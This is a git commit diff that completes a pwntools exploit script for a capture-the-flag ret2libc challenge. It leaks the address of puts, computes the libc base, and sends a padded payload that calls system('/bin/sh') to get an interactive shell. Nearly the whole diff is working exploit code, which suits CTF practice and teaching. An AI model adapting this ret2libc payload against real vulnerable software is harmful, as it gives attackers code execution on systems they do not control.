ef908ffd73bb3b26ebfc06b32af8114653ea9943
Mel-SRK <3203216748@qq.com>
2026-04-16 15:08:18 +0800

    Updata somethin...

--- ctf/pwn/other/re2libc/ret2libc3/exp.py
+++ ctf/pwn/other/re2libc/ret2libc3/exp.py
@@ -4,6 +4,17 @@ context(arch='i386',os='linux',log_level='debug')
 elf=ELF('./ret2libc3')
 libc=ELF('./libc-2.23.so')
 
-p.sendlineafter("(in dec) :",str(elf.got('puts')))
-puts_addr=
+p.sendlineafter("(in dec) :",str(elf.got['puts']))
+puts_addr=p.recvuntil('\n',drop = True)[-10:]
+log.info(elf.got['puts'])
+log.info(puts_addr)
+libc_base=int(puts_addr,16)-libc.symbols['puts']
+sys_addr=libc_base+libc.symbols['system']
+sh_addr=libc_base+next(libc.search(b'/bin/sh'))
+ret_addr=next(elf.search(asm('ret')))
+log.info(ret_addr)
 
+payload=flat([cyclic(60),sys_addr,0,sh_addr])
+
+p.sendlineafter("Leave some message for me :",payload)
+p.interactive()
